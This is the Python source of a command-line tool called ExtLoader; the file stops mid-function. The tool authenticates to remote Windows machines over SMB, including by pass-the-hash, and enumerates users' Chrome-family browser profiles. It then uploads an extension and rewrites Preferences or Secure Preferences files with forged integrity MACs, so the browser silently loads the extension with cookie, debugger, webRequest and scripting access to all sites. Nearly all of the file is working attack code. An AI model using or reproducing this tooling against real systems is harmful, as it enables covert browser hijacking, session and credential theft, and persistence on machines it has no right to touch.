import typer
import json
from datetime import datetime
from typing import Optional, Union
from extloader.utils import log, print_banner, generate_extension_keys
from extloader.user_operations import get_user_sids
from extloader.sign import update_secure_preferences, update_preferences, PreferencesManager
from rich.console import Console
from rich.table import Table
import os
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb3structs import FILE_READ_DATA, FILE_WRITE_DATA
import socket
import tempfile
import shutil
import traceback
from extloader.browser_config import BrowserConfigurator

app = typer.Typer(
    name="ExtLoader",
    help="Remote Chrome extension loader",
    add_completion=False,
)
console = Console()

__version__ = "1.0.0"

def custom_callback(ctx: typer.Context, param: typer.Option, value: bool) -> None:
    """Enhanced help callback with better formatting"""
    if not value or ctx.resilient_parsing:
        return
    
    print_banner()
    command = ctx.command
    console.print(f"[bold]{command.name.capitalize()}[/bold] - {command.help}\n")
    
    # Group parameters by required/optional
    required_params = []
    optional_params = []
    
    for param in command.params:
        if not param.hidden:
            if param.required:
                required_params.append(param)
            else:
                optional_params.append(param)
    
    # Show Required Parameters
    if required_params:
        table = Table(title="Required Parameters", show_header=True, header_style="bold red")
        table.add_column("Option", style="cyan")
        table.add_column("Description", style="green")
        
        for param in required_params:
            # Get all option names (long and short forms)
            option_names = [name for name in param.opts if name.startswith("--")]
            short_names = [name for name in param.opts if name.startswith("-") and not name.startswith("--")]
            option_str = ", ".join([*short_names, *option_names])
            table.add_row(option_str, param.help)
        console.print(table)
        console.print()
    
    # Show Optional Parameters
    if optional_params:
        table = Table(title="Optional Parameters", show_header=True, header_style="bold yellow")
        table.add_column("Option", style="cyan")
        table.add_column("Description", style="green")
        table.add_column("Default", style="blue")
        
        for param in optional_params:
            # Get all option names (long and short forms)
            option_names = [name for name in param.opts if name.startswith("--")]
            short_names = [name for name in param.opts if name.startswith("-") and not name.startswith("--")]
            option_str = ", ".join([*short_names, *option_names])
            # Fixed: Safely get default value
            default = str(param.default) if param.default is not None else ""
            table.add_row(option_str, param.help, default)
        console.print(table)
    
    # Show Usage Examples
    console.print("\n[bold]Usage Examples:[/bold]")
    if command.name == "check":
        console.print("\n  [yellow]Password authentication:[/yellow]")
        console.print("    extloader check -t 192.168.1.100 -u admin -p password")
        console.print("\n  [yellow]Hash authentication:[/yellow]")
        console.print("    extloader check -t 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:ntlm_hash")
    elif command.name == "exploit":
        console.print("\n  [yellow]Deploy extension:[/yellow]")
        console.print("    extloader exploit -t 192.168.1.100 -u admin -p password -i 1 --extension /path/to/extension")
        console.print("    extloader exploit -t 192.168.1.100 -u admin -H ntlm_hash -i 1 --extension ./chrome-mv3")
    elif command.name == "restore":
        console.print("\n  [yellow]Restore preferences:[/yellow]")
        console.print("    extloader restore -t 192.168.1.100 -u admin -p password -i 1 -f Preferences")
        console.print("    extloader restore -t 192.168.1.100 -u admin -H ntlm_hash -i 1 -f \"Secure Preferences\"")
    elif command.name == "sign":
        console.print("\n  [yellow]Sign extension:[/yellow]")
        console.print("    extloader sign --extension /path/to/extension")
    elif command.name == "package":
        console.print("\n  [yellow]Package extension:[/yellow]")
        console.print("    extloader package --prefs-file prefs.json --extension-dir ./chrome-mv3 --target-dir \"C:\\Users\\Public\"")
        console.print("    extloader package --prefs-file \"Secure Preferences\" --extension-dir ./chrome-mv3 --target-dir \"C:\\Users\\Public\" --sid \"S-1-5-21-...\"")
    
    raise typer.Exit()

help_option = typer.Option(
    False, "--help", "-h",
    is_flag=True,
    help="Show this message and exit.",
    callback=custom_callback,
    is_eager=True,
)

def connect_smb(ip: str, username: str, auth_value: str, domain: str, auth_type: str = "password") -> SMBConnection:
    """
    Connect to SMB with support for password or hash-based authentication.
    
    Args:
        ip: Target IP address
        username: Username for authentication
        auth_value: Password or hash value
        domain: Domain name
        auth_type: Type of authentication ("password" or "hash")
    """
    try:
        smb_conn = SMBConnection(ip, ip, sess_port=445)
        
        if auth_type == "password":
            smb_conn.login(user=username, password=auth_value, domain=domain, lmhash='', nthash='', ntlmFallback=False)
        elif auth_type == "hash":
            # For hash auth, we need to pass empty password and the hashes separately
            if ':' in auth_value:
                lm_hash, nt_hash = auth_value.split(':')
            else:
                lm_hash = 'aad3b435b51404eeaad3b435b51404ee'  # Empty LM hash
                nt_hash = auth_value
            log.debug(f"LM Hash: {lm_hash}, NT Hash: {nt_hash}")
            # The correct way to use pass-the-hash with Impacket
            smb_conn.login(user=username, password='', domain=domain, lmhash=lm_hash, nthash=nt_hash, ntlmFallback=False)
        
        log.info("[green]SMB connection established successfully![/green]", extra={"markup": True})
        return smb_conn
    except Exception as e:
        log.error(f"Failed to connect to {ip} using SMB: {str(e)}")
        raise

def backup_file(smb_conn, tree_id, remote_path, local_backup_path):
    try:
        file_id = smb_conn.openFile(tree_id, remote_path, desiredAccess=FILE_READ_DATA)
        file_content = smb_conn.readFile(tree_id, file_id)
        smb_conn.closeFile(tree_id, file_id)
        
        with open(local_backup_path, 'wb') as f:
            f.write(file_content)
        
        log.debug(f"Backed up {remote_path} to {local_backup_path}")
    except Exception as e:
        log.error(f"Failed to backup {remote_path}: {str(e)}")

def write_file(smb_conn, tree_id, remote_path, content):
    try:
        file_id = smb_conn.createFile(tree_id, remote_path)
        smb_conn.writeFile(tree_id, file_id, content)
        smb_conn.closeFile(tree_id, file_id)
        log.info(f"Updated file: {remote_path}")
    except Exception as e:
        log.error(f"Failed to write file {remote_path}: {str(e)}")
        raise

def verify_preferences_structure(content):
    """Verify if the preferences file has valid structure"""
    try:
        data = json.loads(content)
        return "extensions" in data and "settings" in data["extensions"]
    except json.JSONDecodeError:
        return False

@app.command()
def check(
    target: str = typer.Option(
        ..., "-t", "--target",
        help="IP address or hostname to connect to"
    ),
    username: str = typer.Option(
        ..., "-u", "--username",
        help="Username for SMB connection"
    ),
    password: str = typer.Option(
        None, "-p", "--password",
        help="Password for SMB connection (required if hash not provided)"
    ),
    hash_value: str = typer.Option(
        None, "-H", "--hash",
        help="NT hash for authentication (required if password not provided)"
    ),
    domain: str = typer.Option(
        "WORKGROUP", "-d", "--domain",
        help="Domain for SMB connection"
    ),
    debug: bool = typer.Option(
        False, "--debug",
        help="Enable debug logging"
    ),
    help: Optional[bool] = help_option
):
    """List available users and browser targets"""
    
    # Validate required parameters
    missing_params = []
    if not target:
        missing_params.append("-t/--target")
    if not username:
        missing_params.append("-u/--username")
    if not password and not hash_value:
        missing_params.append("-p/--password or -H/--hash")
    
    if missing_params:
        console.print("[red]Error:[/red] Missing required parameters:")
        for param in missing_params:
            console.print(f"  - {param}")
        console.print("\nUse --help for usage information")
        raise typer.Exit(code=1)

    if debug:
        log.setLevel("DEBUG")

    # Validate authentication options
    if password and hash_value:
        console.print("[red]Error:[/red] Cannot specify both password and hash authentication")
        raise typer.Exit(code=1)
    
    if not password and not hash_value:
        console.print("[red]Error:[/red] Must specify either password or hash authentication")
        raise typer.Exit(code=1)

    # Validate IP address format
    try:
        socket.inet_aton(target)
    except socket.error:
        try:
            socket.gethostbyname(target)
        except socket.gaierror:
            console.print(f"[red]Error:[/red] Invalid IP address or hostname: {target}")
            raise typer.Exit(code=1)

    auth_type = "password" if password else "hash"
    auth_value = password if password else hash_value

    try:
        print_banner()
        log.debug(f"Connecting to {target} with {auth_type} authentication")
        log.debug(f"Username: {username}, Auth Value: {auth_value}, Domain: {domain}, Auth Type: {auth_type}")
        smb_conn = connect_smb(target, username, auth_value, domain, auth_type)
        tree_id = smb_conn.connectTree("C$")
        
        # Get users and their SIDs
        users = []
        files = smb_conn.listPath("C$", "Users\\*")
        for file in files:
            if file.is_directory() and file.get_longname() not in ['.', '..']:
                users.append(file.get_longname())
        
        user_sids = get_user_sids(target, username, auth_value, domain, users, auth_type, existing_smb_conn=smb_conn)
        available_targets = []
        target_index = 1

        # Create a simple table with just index, browser, and user info
        table = Table(title="Available Browser Targets")
        table.add_column("Index", style="cyan", justify="center", width=6)
        table.add_column("Browser", style="yellow", width=15)
        table.add_column("User (SID)", style="green")

        browser_configs = BrowserConfigurator.get_browser_configs()
        
        for user in users:
            user_sid = user_sids.get(user, "Unknown")
            for browser_id, config in browser_configs.items():
                secure_path = config.secure_preferences_path.replace('AppData/Local/', '')
                prefs_path = config.preferences_path.replace('AppData/Local/', '')
                
                base_path = f"Users\\{user}\\AppData\\Local"
                secure_path = os.path.join(base_path, secure_path).replace('/', '\\')
                prefs_path = os.path.join(base_path, prefs_path).replace('/', '\\')
                
                # Check if either file exists
                try:
                    if (smb_conn.openFile(tree_id, secure_path, desiredAccess=FILE_READ_DATA) or 
                        smb_conn.openFile(tree_id, prefs_path, desiredAccess=FILE_READ_DATA)):
                        
                        table.add_row(
                            str(target_index),
                            config.name,
                            f"{user} ({user_sid})"
                        )
                        
                        available_targets.append({
                            "user": user,
                            "browser_id": browser_id,
                            "browser_name": config.name,
                            "secure_path": secure_path,
                            "prefs_path": prefs_path,
                            "sid": user_sid
                        })
                        target_index += 1
                except Exception as e:
                    log.debug(f"Error checking {browser_id} for {user}: {str(e)}")

        console.print(table)
        
        # Save targets for exploit command
        if available_targets:
            with open("available_targets.json", 'w') as f:
                json.dump(available_targets, f)
            console.print("\n[green]Found browser targets. Use 'exploit' command with user index to proceed.[/green]")
        else:
            console.print("\n[yellow]No browser targets found.[/yellow]")

    except Exception as e:
        log.error(f"Error during check: {str(e)}")
        if debug:
            log.debug(traceback.format_exc())

@app.command()
def exploit(
    target: str = typer.Option(..., "-t", "--target", help="IP address or hostname to connect to"),
    username: str = typer.Option(..., "-u", "--username", help="Username for SMB connection"),
    password: str = typer.Option(None, "-p", "--password", help="Password for SMB connection"),
    hash_value: str = typer.Option(None, "-H", "--hash", help="NT hash for authentication (LM:NT or just NT)"),
    domain: str = typer.Option("WORKGROUP", "-d", "--domain", help="Domain for SMB connection"),
    user_index: int = typer.Option(..., "-i", "--index", help="Index of the user to target"),
    payload: str = typer.Option(..., "--extension", help="Path to folder containing extension files"),
    debug: bool = typer.Option(False, "--debug", help="Enable debug logging"),
):
    """Load extension for selected user"""
    if debug:
        log.setLevel("DEBUG")

    # Change this validation
    if not os.path.isdir(payload):
        log.error(f"Invalid payload. Directory not found: {payload}")
        raise typer.Exit(code=1)

    manifest_path = os.path.join(payload, 'manifest.json')
    if not os.path.exists(manifest_path):
        log.error("manifest.json not found in the extension folder")
        raise typer.Exit(code=1)

    if password and hash_value:
        log.error("Cannot specify both password and hash authentication")
        raise typer.Exit(code=1)
    
    if not password and not hash_value:
        log.error("Must specify either password or hash authentication")
        raise typer.Exit(code=1)

    auth_type = "password" if password else "hash"
    auth_value = password if password else hash_value

    try:
        print_banner()
        log.info(f"Starting exploit for {target}")
        
        # Load available targets
        if not os.path.exists("available_targets.json"):
            log.error("No targets found. Please run 'check' command first.")
            raise typer.Exit(code=1)
            
        with open("available_targets.json", 'r') as f:
            available_targets = json.load(f)
        
        if user_index < 1 or user_index > len(available_targets):
            log.error(f"Invalid target index. Please choose between 1 and {len(available_targets)}")
            raise typer.Exit(code=1)
        
        target_info = available_targets[user_index - 1]
        log.info(f"Targeting {target_info['browser_name']} for user {target_info['user']}")
        
        # Step 1: Check the folder locally and read manifest.json
        if not os.path.isdir(payload):
            log.error("Invalid payload. Please provide a folder containing extension files.")
            raise typer.Exit(code=1)
            
        manifest_path = os.path.join(payload, 'manifest.json')
        if not os.path.exists(manifest_path):
            log.error("manifest.json not found in the folder.")
            raise typer.Exit(code=1)
        
        with open(manifest_path, 'r', encoding="utf-8") as manifest_file:
            manifest_content = manifest_file.read()
            log.debug(f"Manifest content: {manifest_content}")
        
        log.info("Manifest.json read successfully.")

        try:
            smb_conn = connect_smb(target, username, auth_value, domain, auth_type)
            tree_id = smb_conn.connectTree("C$")
            
            # List users in C:\Users
            users = []
            files = smb_conn.listPath("C$", "Users\\*")
            for file in files:
                if file.is_directory() and file.get_longname() not in ['.', '..']:
                    users.append(file.get_longname())
            
            if user_index < 1 or user_index > len(users):
                log.error(f"Invalid user index. Please choose a number between 1 and {len(users)}")
                raise typer.Exit(code=1)
            
            target_user = users[user_index - 1]
            log.debug(f"Targeting user: {target_user}")
            
            # Change the extension upload path to use Public instead of All Users
            extension_base_path = "Users\\Public\\extension"  # Changed from All Users to Public
            absolute_extension_path = f"C:\\{extension_base_path}"
            
            log.info(f"Uploading extension to {absolute_extension_path}")
            
            # Create temp directory and copy extension files
            with tempfile.TemporaryDirectory() as temp_dir:
                temp_extension_dir = os.path.join(temp_dir, "extension")
                shutil.copytree(payload, temp_extension_dir)
                
                # Upload the extension folder
                if not upload_folder(smb_conn, tree_id, temp_extension_dir, extension_base_path):
                    log.error("Failed to upload extension folder")
                    raise typer.Exit(code=1)

            log.debug(f"Using extension path: {absolute_extension_path}")
            
            prefs_info = check_preferences_files(smb_conn, "C$", tree_id, target_info['user'], target_info['sid'], target_info['browser_id'])
            if not prefs_info:
                raise typer.Exit(code=1)
            
            file_type, file_path, content = prefs_info
            
            # Create backup with correct file type
            backup_path = f"{target_info['browser_name']}_{file_type}_{target_info['user']}_{domain}_{datetime.now().strftime('%Y%m%d_%H%M')}.bak"
            with open(backup_path, 'wb') as f:
                f.write(content)
            log.info(f"Created backup: {backup_path}")
            
            # Update the appropriate preferences file using the correct path from target_info
            if file_type == "Secure Preferences":
                updated_content = update_secure_preferences(
                    content,
                    absolute_extension_path,
                    target_info['sid'],
                    manifest_content,
                    target_info['browser_id']
                )
            else:
                updated_content = update_preferences(
                    content,
                    absolute_extension_path,
                    target_info['sid'],
                    manifest_content
                )
            
            if not updated_content:
                raise typer.Exit(code=1)
            
            # Write to the correct path from target_info
            write_file(smb_conn, tree_id, target_info['secure_path' if file_type == "Secure Preferences" else 'prefs_path'], updated_content)
            log.info(f"Successfully updated {file_type} for user: {target_info['user']}")

            log.info("Exploit completed successfully")

        except Exception as e:
            log.error(f"Failed to perform exploit: {str(e)}")
            log.debug("Exception details:", exc_info=True)
            raise typer.Exit(code=1)

        finally:
            if 'smb_conn' in locals():
                smb_conn.close()

    except Exception as e:
        log.error(f"Failed to perform exploit: {str(e)}")
        log.debug("Exception details:", exc_info=True)
        raise typer.Exit(code=1)

def upload_folder(smb_conn, tree_id, local_path, remote_path):
    def create_directory(path):
        try:
            log.debug(f"Attempting to create directory: {path}")
            log.debug(f"Type of path: {type(path)}")
            log.debug(f"Content of path: {path}")
            
            # Ensure path is a string
            if not isinstance(path, str):
                log.error(f"Path is not a string. Type: {type(path)}, Value: {path}")
                return False
            
            # Split the path into share name and path name
            parts = path.split('/', 1)
            if len(parts) != 2:
                log.error(f"Invalid path format: {path}")
                return False
            
            share_name, path_name = parts
            
            smb_conn.createDirectory(share_name, path_name)
            log.debug(f"Created directory: {path}")
            return True
        except Exception as e:
            if 'STATUS_OBJECT_NAME_COLLISION' in str(e):
                log.debug(f"Directory already exists: {path}")
                return True
            log.error(f"Failed to create directory {path}: {str(e)}")
            return False

    def upload_file(local_file_path, remote_file_path):
        try:
            with open(local_file_path, 'rb') as f:
                file_content = f.read()
            
            log.debug(f"Attempting to create file: {remote_file_path}")
            file_id = smb_conn.createFile(tree_id, remote_file_path, desiredAccess=FILE_WRITE_DATA, shareMode=0x00)
            log.debug(f"File created successfully: {remote_file_path}")
            
            log.debug(f"Writing content to file: {remote_file_path}")
            smb_conn.writeFile(tree_id, file_id, file_content)
            log.debug(f"Content written successfully to: {remote_file_path}")
            
            smb_conn.closeFile(tree_id, file_id)
            log.debug(f"File closed successfully: {remote_file_path}")
            
            log.info(f"Uploaded: {remote_file_path}")
            return True
        except Exception as e:
            log.error(f"Failed to upload {remote_file_path}: {str(e)}")
            return False

    log.debug(f"Starting upload of folder: {local_path} to {remote_path}")

    # Create the main remote directory
    log.debug(f"Attempting to create main directory: {remote_path}")
    main_dir_path = f"C$/{remote_path}"  # Assuming it's alwats C$
    if not create_directory(main_dir_path):
        log.error(f"Failed to create main directory: {main_dir_path}")
        return False
    log.debug(f"Main directory created or already exists: {main_dir_path}")

    for root, dirs, files in os.walk(local_path):
        for dir_name in dirs:
            local_dir_path = os.path.join(root, dir_name)
            relative_path = os.path.relpath(local_dir_path, local_path)
            remote_dir_rel = os.path.join(remote_path, relative_path).replace('\\', '/')
            remote_dir_path = "C$/" + remote_dir_rel
            log.debug(f"Attempting to create directory: {remote_dir_path}")
            if not create_directory(remote_dir_path):
                log.error(f"Failed to create directory: {remote_dir_path}")
                return False
            log.debug(f"Directory created or already exists: {remote_dir_path}")

        for file_name in files:
            local_file_path = os.path.join(root, file_name)
            relative_path = os.path.relpath(local_file_path, local_path)
            remote_file_path = os.path.join(remote_path, relative_path).replace('\\', '/')
            log.debug(f"Attempting to upload file: {local_file_path} to {remote_file_path}")
            if not upload_file(local_file_path, remote_file_path):
                log.error(f"Failed to upload file: {local_file_path} to {remote_file_path}")
                return False
            log.debug(f"File uploaded successfully: {remote_file_path}")

    log.info(f"Folder upload completed successfully: {local_path} to {remote_path}")
    return True

@app.command()
def restore(
    target: str = typer.Option(..., "-t", "--target", help="IP address or hostname to connect to"),
    username: str = typer.Option(..., "-u", "--username", help="Username for SMB connection"),
    password: str = typer.Option(None, "-p", "--password", help="Password for SMB connection"),
    hash_value: str = typer.Option(None, "-H", "--hash", help="NT hash for authentication (LM:NT or just NT)"),
    domain: str = typer.Option("WORKGROUP", "-d", "--domain", help="Domain for SMB connection"),
    filename: str = typer.Option(..., "-f", "--file", help="Path to preferences file to restore"),
    user_index: int = typer.Option(..., "-i", "--index", help="Index of the user to target (from check command)"),
    debug: bool = typer.Option(False, "--debug", help="Enable debug logging"),
    help: Optional[bool] = help_option
):
    """Restore a previously downloaded Chrome Preferences file to the target machine."""
    if debug:
        log.setLevel("DEBUG")

    if password and hash_value:
        log.error("Cannot specify both password and hash authentication")
        raise typer.Exit(code=1)
    
    if not password and not hash_value:
        log.error("Must specify either password or hash authentication")
        raise typer.Exit(code=1)

    auth_type = "password" if password else "hash"
    auth_value = password if password else hash_value

    print_banner()
    log.info(f"Starting restore operation for file: {filename}")
    
    if not os.path.exists(filename):
        log.error(f"File not found: {filename}")
        raise typer.Exit(code=1)

    # Load and validate preferences file
    try:
        with open(filename, 'rb') as f:
            prefs_content = f.read()
            prefs_data = json.loads(prefs_content)
            is_secure = "protection" in prefs_data and "super_mac" in prefs_data.get("protection", {})
            file_type = "Secure Preferences" if is_secure else "Preferences"
            log.info(f"Detected file type: {file_type}")
    except json.JSONDecodeError:
        log.error("Invalid preferences file format")
        raise typer.Exit(code=1)
    except Exception as e:
        log.error(f"Error reading preferences file: {str(e)}")
        raise typer.Exit(code=1)

    try:
        # Load available targets
        if not os.path.exists("available_targets.json"):
            log.error("No targets found. Please run 'check' command first.")
            raise typer.Exit(code=1)
            
        with open("available_targets.json", 'r') as f:
            available_targets = json.load(f)
        
        if user_index < 1 or user_index > len(available_targets):
            log.error(f"Invalid target index. Please choose between 1 and {len(available_targets)}")
            raise typer.Exit(code=1)
        
        target_info = available_targets[user_index - 1]
        log.info(f"Targeting {target_info['browser_name']} for user {target_info['user']}")

        # Connect to SMB
        try:
            smb_conn = connect_smb(target, username, auth_value, domain, auth_type)
            tree_id = smb_conn.connectTree("C$")

            # Determine correct path based on file type
            if is_secure:
                remote_path = target_info['secure_path']
            else:
                remote_path = target_info['prefs_path']

            log.info(f"Restoring {file_type} to: {remote_path}")

            # Replacing it with the new preferences file
            try:
                file_id = smb_conn.createFile(tree_id, remote_path)
                smb_conn.writeFile(tree_id, file_id, prefs_content)
                smb_conn.closeFile(tree_id, file_id)
                log.info(f"Successfully restored {file_type} for user: {target_info['user']}")
            except Exception as e:
                log.error(f"Failed to write {file_type}: {str(e)}")
                raise

        except Exception as e:
            log.error(f"SMB operation failed: {str(e)}")
            if debug:
                log.debug(traceback.format_exc())
            raise typer.Exit(code=1)

        finally:
            if 'smb_conn' in locals():
                smb_conn.close()

    except Exception as e:
        log.error(f"Restore operation failed: {str(e)}")
        if debug:
            log.debug(traceback.format_exc())
        raise typer.Exit(code=1)

    log.info("Restore operation completed successfully")

@app.command()
def version(
    help: Optional[bool] = help_option
):
    """Display the current version of ExtLoader."""
    console.print(f"ExtLoader version: {__version__}")

@app.command()
def sign(
    extension: str = typer.Option(..., "--extension", help="Path to folder containing extension files"),
    debug: bool = typer.Option(False, "--debug", help="Enable debug logging"),
    help: Optional[bool] = help_option
):
    """
    Generate extension keys for Chrome and update the manifest.json file.
    """
    if debug:
        log.setLevel("DEBUG")

    try:
        crx_id, pub_key, priv_key = generate_extension_keys()
        log.debug(f"Generated CRX_ID: {crx_id}")
        log.debug(f"Generated PUBLIC_KEY: {pub_key}")
        log.debug(f"Generated PRIVATE_KEY: {priv_key}")

        manifest_path = os.path.join(extension, 'manifest.json')
        if not os.path.exists(manifest_path):
            log.error(f"manifest.json not found in {extension}")
            raise typer.Exit(code=1)

        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = json.load(f)

        manifest['key'] = pub_key
        
        with open(manifest_path, 'w', encoding='utf-8') as f:
            json.dump(manifest, f, indent=2)

        log.info(f"Updated manifest.json with new public key")

        # Save the generated keys to a file in the current working directory
        keys_file = 'extension_keys.json'
        with open(keys_file, 'w', encoding='utf-8') as f:
            json.dump({
                'crx_id': crx_id,
                'public_key': pub_key,
                'private_key': priv_key
            }, f, indent=2)

        log.info(f"Saved generated keys to {keys_file}")

    except Exception as e:
        log.error(f"Error generating keys: {e}")
        log.debug(traceback.format_exc())
        raise typer.Exit(code=1)

    console.print(f"CRX_ID={crx_id}")
    console.print(f"PUBLIC_KEY={pub_key}")
    console.print(f"PRIVATE_KEY={priv_key}")
    console.print(f"Keys have been saved to {keys_file}")

@app.command()
def package(
    prefs_file: str = typer.Option(..., "--prefs-file", help="Path to preferences file (SPF or Preferences)"),
    extension_dir: str = typer.Option(..., "--extension-dir", help="Local extension directory (e.g., /home/user/extensions/chrome-mv3)"),
    target_dir: str = typer.Option(..., "--target-dir", help="Remote deployment directory (e.g., C:\\Users\\Public)"),
    sid: str = typer.Option(None, "--sid", help="User SID (required only for Secure Preferences)"),
    output: str = typer.Option(None, "--output", help="Output directory (default: current directory)"),
    debug: bool = typer.Option(False, "--debug", help="Enable debug logging"),
    help: Optional[bool] = help_option
):
    """Sign extension and prepare preferences file with proper extension registration"""
    if debug:
        log.setLevel("DEBUG")

    try:
        # Validate inputs
        if not os.path.exists(prefs_file):
            log.error(f"Preferences file not found: {prefs_file}")
            raise typer.Exit(code=1)

        if not os.path.isdir(extension_dir):
            log.error(f"Extension directory not found: {extension_dir}")
            raise typer.Exit(code=1)

        # Determine if we're dealing with Secure Preferences
        with open(prefs_file, 'rb') as f:
            prefs_content = f.read()
            prefs_data = json.loads(prefs_content)
            is_secure = "protection" in prefs_data and "super_mac" in prefs_data.get("protection", {})

        # Validate SID requirement for Secure Preferences
        if is_secure and not sid:
            log.error("SID is required when using Secure Preferences")
            raise typer.Exit(code=1)

        # Use a default SID for non-secure preferences
        if not sid:
            sid = "S-1-5-21-1234567890-1234567890-1234567890-1001"

        # Get the actual folder name and validate extension structure
        extension_name = os.path.basename(extension_dir.rstrip('/'))
        manifest_path = os.path.join(extension_dir, 'manifest.json')
        
        if not os.path.exists(manifest_path):
            log.error("manifest.json not found in extension directory")
            raise typer.Exit(code=1)

        # Read manifest first to get extension details
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = json.load(f)

        # Normalization / validation of target dir
        target_dir = target_dir.replace('/', '\\').rstrip('\\')
        if not target_dir.startswith('\\\\') and not (len(target_dir) > 1 and target_dir[1] == ':'):
            log.error("Target directory must be either a UNC path (\\\\server\\share) or absolute path (C:\\path)")
            raise typer.Exit(code=1)

        # Construct final deployment path
        deploy_path = f"{target_dir}\\{extension_name}"
        log.info(f"Extension will be deployed to: {deploy_path}")

        # Generate extension keys
        crx_id, pub_key, priv_key = generate_extension_keys()
        log.debug(f"Generated CRX ID: {crx_id}")

        # Determine preferences type if SPF||Preferences
        with open(prefs_file, 'rb') as f:
            prefs_content = f.read()
            prefs_data = json.loads(prefs_content)
            is_secure = "protection" in prefs_data and "super_mac" in prefs_data.get("protection", {})
            prefs_type = "spf" if is_secure else "pref"

        timestamp = datetime.now().strftime('%Y%m%d-%H%M')
        output_filename = f"{extension_name}_{prefs_type}_{timestamp}"
        if output:
            output_path = os.path.join(output, output_filename)
        else:
            output_path = output_filename

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create directory structure
            extension_base_dir = os.path.join(temp_dir, "extension")
            prefs_dir = os.path.join(temp_dir, "preferences")
            os.makedirs(extension_base_dir)
            os.makedirs(prefs_dir)

            # Copy extension directory keeping original name under extension/
            temp_extension_dir = os.path.join(extension_base_dir, extension_name)
            shutil.copytree(extension_dir, temp_extension_dir)
            
            # Update manifest with public key
            manifest['key'] = pub_key
            with open(os.path.join(temp_extension_dir, 'manifest.json'), 'w', encoding='utf-8') as f:
                json.dump(manifest, f, indent=2)

            # Initialize info structure
            info = {
                "extension_id": crx_id,
                "preferences_type": prefs_type.upper(),
                "timestamp": timestamp,
                "sid": sid,
                "extension": {
                    "name": extension_name,
                    "local_path": extension_dir,
                    "deploy_path": deploy_path
                },
                "browsers": {}
            }

            # Process for each browser
            browser_configs = BrowserConfigurator.get_browser_configs()
            for browser_id, config in browser_configs.items():
                browser_dir = os.path.join(prefs_dir, config.name.lower().replace(' ', '-'))
                os.makedirs(browser_dir)

                # Create extension JSON with browser-specific settings
                extension_json = {
                    "active_permissions": {
                        "api": [
                            "activeTab", "cookies", "debugger", "webNavigation", 
                            "webRequest", "scripting"
                        ],
                        "explicit_host": ["<all_urls>"],
                        "manifest_permissions": [],
                        "scriptable_host": ["<all_urls>"]
                    },
                    "commands": {},
                    "content_settings": [],
                    "creation_flags": 38,
                    "from_webstore": False,
                    "granted_permissions": {
                        "api": [
                            "activeTab", "cookies", "debugger", "webNavigation", 
                            "webRequest", "scripting"
                        ],
                        "explicit_host": ["<all_urls>"],
                        "manifest_permissions": [],
                        "scriptable_host": ["<all_urls>"]
                    },
                    "incognito_content_settings": [],
                    "incognito_preferences": {},
                    "location": config.default_location,
                    "newAllowFileAccess": True,
                    "path": deploy_path,  # Use the remote path here
                    "preferences": {},
                    "regular_only_preferences": {},
                    "state": 1,
                    "version": manifest.get('version', '1.0'),
                    "was_installed_by_default": False,
                    "was_installed_by_oem": False
                }

                # Update preferences with extension and developer mode
                prefs_manager = PreferencesManager(browser_id)
                if is_secure:
                    data = json.loads(prefs_content)
                    if "extensions" not in data:
                        data["extensions"] = {}
                    if "settings" not in data["extensions"]:
                        data["extensions"]["settings"] = {}
                    if "ui" not in data["extensions"]:
                        data["extensions"]["ui"] = {}
                    data["extensions"]["ui"]["developer_mode"] = True
                    data["extensions"]["settings"][crx_id] = extension_json

                    path = f"extensions.settings.{crx_id}"
                    macs = PreferencesManager.calculate_hmac(extension_json, path, sid, prefs_manager.seed)

                    if "protection" not in data:
                        data["protection"] = {}
                    if "macs" not in data["protection"]:
                        data["protection"]["macs"] = {}
                    if "extensions" not in data["protection"]["macs"]:
                        data["protection"]["macs"]["extensions"] = {}
                    if "settings" not in data["protection"]["macs"]["extensions"]:
                        data["protection"]["macs"]["extensions"]["settings"] = {}
                    data["protection"]["macs"]["extensions"]["settings"][crx_id] = macs

                    if "ui" not in data["protection"]:
                        data["protection"]["ui"] = {}
                    dev_mode_path = "extensions.ui.developer_mode"
                    dev_mode_mac = PreferencesManager.calculate_hmac(True, dev_mode_path, sid, prefs_manager.seed)
                    data["protection"]["ui"]["developer_mode"] = dev_mode_mac

                    supermac = PreferencesManager.calc_supermac(data, sid, prefs_manager.seed)
                    data["protection"]["super_mac"] = supermac

                    file_name = "Secure Preferences"
                else:
                    data = json.loads(prefs_content)
                    if "extensions" not in data:
                        data["extensions"] = {}
                    if "settings" not in data["extensions"]:
                        data["extensions"]["settings"] = {}
                    if "ui" not in data["extensions"]:
                        data["extensions"]["ui"] = {}
                    data["extensions"]["ui"]["developer_mode"] = True
                    data["extensions"]["settings"][crx_id] = extension_json

                    if "protection" not in data:
                        data["protection"] = {}
                    if "macs" not in data["protection"]:
                        data["protection"]["macs"] = {}
                    if "extensions" not in data["protection"]["macs"]:
                        data["protection"]["macs"]["extensions"] = {}
                    if "settings" not in data["protection"]["macs"]["extensions"]:
                        data["protection"]["macs"]["extensions"]["settings"] = {}
                    path = f"extensions.settings.{crx_id}"
                    mac = PreferencesManager.calculate_hmac(extension_json, path, sid, prefs_manager.seed)
                    data["protection"]["macs"]["extensions"]["settings"][crx_id] = mac

                    if "ui" not in data["protection"]:
                        data["protection"]["ui"] = {}
                    dev_mode_path = "extensions.ui.developer_mode"
                    dev_mode_mac = PreferencesManager.calculate_hmac(True, dev_mode_path, sid, prefs_manager.seed)
                    data["protection"]["ui"]["developer_mode"] = dev_mode_mac

                    file_name = "Preferences"

                # Save browser-specific preferences
                prefs_path = os.path.join(browser_dir, file_name)
                with open(prefs_path, 'wb') as f:
                    f.write(json.dumps(data, ensure_ascii=False).encode('utf-8'))

                # Add browser info to info.json
                info["browsers"][browser_id] = {
                    "name": config.name,
                    "preferences_file": file_name,
                    "preferences_path": config.secure_preferences_path if is_secure else config.preferences_path,
                    "extension_path": deploy_path,  # Use the remote path here
                    "has_seed": bool(config.seed)
                }

            # Save info.json
            with open(os.path.join(temp_dir, "info.json"), 'w', encoding='utf-8') as f:
                json.dump(info, f, indent=2)

            # Create ZIP archive
            shutil.make_archive(output_path, 'zip', temp_dir)
            
            log.info(f"\nPackage created: {output_path}.zip")
            log.info("\nTo deploy:")
            log.info(f"1. Copy {extension_name} to {deploy_path}")
            log.info(f"2. Replace browser {'Secure Preferences' if is_secure else 'Preferences'} files:")
            log.info("See info.json for additional deployment details")

    except Exception as e:
